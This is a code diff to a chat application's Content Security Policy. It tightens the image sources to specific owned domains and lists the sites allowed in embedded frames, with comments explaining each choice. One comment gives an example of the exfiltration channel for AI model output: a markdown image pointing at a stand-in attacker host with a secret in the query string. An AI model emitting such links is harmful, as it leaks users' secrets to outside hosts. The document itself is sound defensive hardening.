@@ -19,8 +19,7 @@
  *
  * `frame-ancestors 'self'` (with `X-Frame-Options: SAMEORIGIN`) refuses framing by
  * any other origin; same-origin is needed for the silent.mp3 audio unlock iframe.
- * Both framing directives are now closed to every third party: nothing may embed
- * US, and we embed nobody.
+ * Nothing may embed US. What WE embed is enumerated in `frame-src` below.
  */
 const contentSecurityPolicy = [
   "default-src 'self'",
@@ -28,12 +27,61 @@ const contentSecurityPolicy = [
   // Telemetry is the @hanzo/event client, which only ever POSTs (connect-src).
   "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://hanzo.app https://static.cloudflareinsights.com",
   "style-src 'self' 'unsafe-inline'",
-  "img-src 'self' data: blob: https:",
+  // NOT `https:`. A bare-scheme image source is the classic LLM exfiltration
+  // channel: model output `![](https://attacker/p?d=<secret>)` auto-fires a
+  // GET the instant it renders. The app's own images are same-origin (served
+  // from /v1/chat/images) or come from our file store; nothing legitimate
+  // needs an arbitrary host. The markdown image RENDERER also refuses to
+  // auto-load a third-party src (MarkdownComponents.tsx `autoLoadable`) — this
+  // is the backstop under it, so a future renderer that forgets still cannot
+  // beacon.
+  // The file store answers on a PER-BUCKET host — an uploaded image comes back
+  // from `chat-files.s3-api.hanzo.ai`, not from the bare API host — so naming
+  // only the apex silently blocked every image a user had uploaded. The wildcard
+  // covers the bucket subdomains and nothing else: it is one registrable domain
+  // we own, not a bare scheme, so the exfiltration channel described above stays
+  // shut.
+  // hanzo.id serves the account's profile photo (the `picture` claim the IAM
+  // login stores as the user's avatar); the account menu renders it as a plain
+  // <img>. Safe to allow: it is our own IdP (one registrable domain we own,
+  // not a scheme), and the markdown image renderer still auto-loads ONLY
+  // same-origin, so this cannot become a beacon in message content.
+  "img-src 'self' data: blob: https://hanzo.id https://s3.hanzo.ai https://s3-api.hanzo.ai https://*.s3-api.hanzo.ai",
   "font-src 'self' data:",
   "media-src 'self' data: blob:",
   "connect-src 'self' https://hanzo.id https://hanzo.app https://*.hanzo.ai https://*.hanzo.chat wss://*.hanzo.chat https://static.cloudflareinsights.com https://cloudflareinsights.com",
-  // 'self' keeps the same-origin silent.mp3 audio-unlock iframe. Nothing else.
-  "frame-src 'self'",
+  // 'self' keeps the same-origin silent.mp3 audio-unlock iframe.
+  //
+  // www.youtube.com and player.twitch.tv are the only players the backdrop can
+  // embed (components/Chat/Backdrop.tsx) — youtube, not nocookie, because that
+  // host answers embeds with a configuration error. This list is what makes
+  // "Netflix cannot play here" true in the browser and not merely in the UI
+  // copy: an origin not named here cannot be framed whatever anyone configures.
+  //
+  // world.hanzo.ai is the dock's widget card (components/Chat/Dock). Every
+  // origin here is enumerated on purpose rather than widened to *.hanzo.ai:
+  // frame-src decides what may be rendered INSIDE this page, so a wildcard
+  // would let any future subdomain — including one nobody reviewed — frame
+  // itself over the conversation. A card whose origin is missing renders an
+  // EMPTY frame and logs nothing useful, so cards.spec.ts asserts every card's
+  // origin appears here.
+  //
+  // THE TRADEOFF THIS LINE OWNS, stated so it can be decided rather than drifted
+  // into: the bottom bar's Browser tab frames a URL the READER types, and this
+  // list refuses every origin but the three above. So the feature, as policy
+  // stands, can browse essentially nothing — a reader who types example.com is
+  // refused. That is a security decision, not a UI one, and it is deliberately
+  // NOT taken here: widening `frame-src` to `https:` would let any origin be
+  // framed over the conversation, and a widened list cannot be un-widened once
+  // cards and readers depend on it. What was fixed instead is the SILENCE — the
+  // refusal now renders an explicit state naming the origin, with a link that
+  // opens it in a new tab (`SidePanel/Preview/Panel.tsx`, which listens for the
+  // `securitypolicyviolation` this directive fires). Deciding to widen means
+  // deciding what a framed third-party page may do next to a conversation:
+  // clickjacking over the composer, and every reader's typed URL becoming a
+  // load this origin performs. Take that decision explicitly, or leave the tab
+  // honest about its limits.
+  "frame-src 'self' https://www.youtube.com https://player.twitch.tv https://world.hanzo.ai",
   "frame-ancestors 'self'",
 ].join('; ');
 
